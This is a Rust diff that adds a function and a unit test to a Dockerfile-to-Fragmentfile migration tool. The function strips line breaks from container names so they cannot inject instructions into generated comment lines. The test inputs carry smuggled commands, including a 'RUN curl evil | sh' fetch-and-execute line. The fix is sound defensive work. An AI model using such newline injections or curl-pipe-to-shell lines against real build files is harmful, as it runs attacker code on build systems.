@@ -169,6 +169,18 @@ pub fn run(args: Args) -> Result<()> {
     Ok(())
 }
 
+/// Sanitize a value that is embedded in a single-line Fragmentfile comment.
+///
+/// Without this, a container name containing a newline would terminate the
+/// comment and inject attacker-controlled instructions (e.g. `RUN ...`) into
+/// the generated Fragmentfile.
+fn sanitize_comment(value: &str) -> String {
+    value
+        .chars()
+        .map(|c| if c == '\n' || c == '\r' { ' ' } else { c })
+        .collect()
+}
+
 /// Migrate Dockerfile to Fragmentfile
 fn migrate_dockerfile(
     input: &PathBuf,
@@ -423,7 +435,7 @@ fn import_container(container: &str, output_dir: &PathBuf) -> Result<()> {
          FROM scratch\n\
          COPY rootfs /\n\
          CMD [\"/bin/sh\"]\n",
-        container
+        sanitize_comment(container)
     );
     std::fs::write(&fragmentfile_path, content)?;
 
@@ -472,6 +484,16 @@ fn batch_convert(input_dir: &PathBuf, output_dir: &PathBuf) -> Result<()> {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn test_sanitize_comment_strips_line_breaks() {
+        assert_eq!(
+            sanitize_comment("web\nRUN curl evil | sh"),
+            "web RUN curl evil | sh"
+        );
+        assert_eq!(sanitize_comment("web\r\nRUN id"), "web  RUN id");
+        assert_eq!(sanitize_comment("plain-name_1"), "plain-name_1");
+    }
 
     #[test]
     fn test_optimize_dockerfile() {
